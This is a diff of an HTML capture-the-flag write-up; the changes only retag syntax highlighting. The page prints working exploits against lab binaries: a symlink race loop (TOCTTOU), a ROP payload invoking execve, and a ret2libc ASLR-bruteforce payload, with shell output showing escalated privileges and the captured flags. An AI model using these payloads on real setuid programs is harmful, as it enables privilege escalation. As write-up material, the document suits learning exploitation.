@@ -241,9 +241,9 @@ flag : you dont have enough permissions to <span class="nb">read </span>this fil
 <p>To do it, we will begin by create a file in the tmp directory.This file will be used for the first symbolic link. My friend solved the challenge in python but I’m better in Bash so I will show you the Bash method. To solved the challenge, we will need 2 shell. The first one will do an infine look with 4 command. The two first will create a symlink with the previous created file and then deleted this link and the two next command will created a symlink between with the flag file and then deleted this symlink. The second shell will run the binary in an infinite loop with the symlink as argument. The goal is to set the symlink when access check the file and then change that symlink when the file will be read with the flag file. You can see below a little scheme about the attack:<img src="/assets/media/tocttou_schema.png" alt="tocttou scheme" /></p>
 
 <p>Now let’s try it! Below is the first shell view:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>touch /tmp/dagger/foo
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">touch</span> /tmp/dagger/foo
 
-<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>ln <span class="nt">-s</span> /tmp/dagger/foo /tmp/dagger/toc<span class="p">;</span> unlink /tmp/dagger/toc<span class="p">;</span> ln <span class="nt">-s</span> /challenges/tocttou/flag /tmp/dagger/toc<span class="p">;</span> unlink /tmp/dagger/toc<span class="p">;</span> <span class="k">done</span>
+<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">ln</span> <span class="nt">-s</span> /tmp/dagger/foo /tmp/dagger/toc<span class="p">;</span> <span class="nb">unlink</span> /tmp/dagger/toc<span class="p">;</span> <span class="nb">ln</span> <span class="nt">-s</span> /challenges/tocttou/flag /tmp/dagger/toc<span class="p">;</span> <span class="nb">unlink</span> /tmp/dagger/toc<span class="p">;</span> <span class="k">done</span>
 
 </code></pre></div></div>
 
@@ -322,22 +322,22 @@ RDX = 0x0</p>
 <p>RDI/RSI/RDX are set to the good value but we have to set RAX. In the “fuckit” function we can see 3 “pop”. The first and the second one will pop the RDI value and 0x0, the two value pushed just before. But we can control the last one so we will add the value 0x3b (59) on the stack to poped it in RAX. Then we need to do the syscall. To do it we will jump into one of the two syscall instructions in the “breakme” function. I choose the first one.</p>
 
 <p>The exploit will look like that:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">import</span> <span class="nn">struct</span>
 
-<span class="n">fuckit_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000fa</span><span class="p">)</span>	 <span class="c"># Fuckit function address</span>
-<span class="n">execve</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">)</span>			            <span class="c"># Execve syscall number</span>
-<span class="n">syscall_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000dd</span><span class="p">)</span>    <span class="c"># Syscall instruction address</span>
-<span class="n">padding</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span>						               <span class="c"># Padding before overflow</span>
-
+<span class="n">fuckit_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000fa</span><span class="p">)</span>	 <span class="c1"># Fuckit function address
+</span><span class="n">execve</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">)</span>			            <span class="c1"># Execve syscall number
+</span><span class="n">syscall_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000dd</span><span class="p">)</span>    <span class="c1"># Syscall instruction address
+</span><span class="n">padding</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span>						               <span class="c1"># Padding before overflow
+</span>
 <span class="k">print</span> <span class="n">padding</span><span class="o">+</span><span class="n">fuckit_addr</span><span class="o">+</span><span class="n">execve</span><span class="o">+</span><span class="n">syscall_addr</span>
 </code></pre></div></div>
 
 <p>And then we test it:</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>python /tmp/dagger/basicrop.py<span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./basicrop 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@<span class="p">;</span>�@id
-<span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1308<span class="o">(</span>basic_rop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1305<span class="o">(</span>robot_cop<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1308<span class="o">(</span>basic_rop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1305<span class="o">(</span>robot_cop<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
 <span class="nb">cat </span>flag
 flag<span class="o">{</span>r0ppin9_Y0ur_waY_t0_h3aveN<span class="o">}</span>
 </code></pre></div></div>
@@ -727,20 +727,20 @@ Only Inspector Gadget, can use Robot cOP
 <p>The function is very easy. First it allocate 0x808 (2056) bytes on the stack, then push the first argument which is the first program argument, then load the address of the allocated buffer, push that buffer and then copy the first program argument into the buffer. So if we give to strcpy a buffer greater than 0x808 bytes we will overflow the return adress.</p>
 
 <p>Instead of using the ROP technic to solve the challenge, I choose a very fast one which I described in a <a href="/pwn/2017/05/14/aslr_bruteforce.html">previous post</a>, the ASLR bruteforce! As I already explained it in details in my previous post, I will only show you the final exploit:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-<span class="c"># coding: utf-8</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# coding: utf-8
+</span>
 <span class="kn">import</span> <span class="nn">struct</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 
-<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf754e000</span>                  <span class="c"># base libc address's</span>
-<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>         <span class="c"># system offset function</span>
-<span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>           <span class="c"># exit offset function</span>
-<span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>                 <span class="c"># /bin/sh  addresse's contained in the binary</span>
-
-<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c"># final system address's</span>
-<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c"># final exit address's</span>
-
+<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf754e000</span>                  <span class="c1"># base libc address's
+</span><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>         <span class="c1"># system offset function
+</span><span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>           <span class="c1"># exit offset function
+</span><span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>                 <span class="c1"># /bin/sh  addresse's contained in the binary
+</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c1"># final system address's
+</span><span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c1"># final exit address's
+</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">2060</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">system_addr</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">exit_addr</span><span class="p">)</span>
@@ -764,8 +764,8 @@ KO
 KO
 ...
 
-<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1310<span class="o">(</span>robot_cop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1307<span class="o">(</span>basic_rop<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1310<span class="o">(</span>robot_cop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1307<span class="o">(</span>basic_rop<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
 <span class="nv">$ </span><span class="nb">cat </span>flag
 flag<span class="o">{</span>0r5t7hvR4dfTyhj67yKLO<span class="o">}</span>
 </code></pre></div></div>
@@ -797,7 +797,7 @@ flag<span class="o">{</span>0r5t7hvR4dfTyhj67yKLO<span class="o">}</span>
 			 
 				<li>
 					<a href="/tags.html#pwn-ref">
-					pwn <span>(10)</span>
+					pwn <span>(11)</span>
 					,
 					</a>
 				</li>
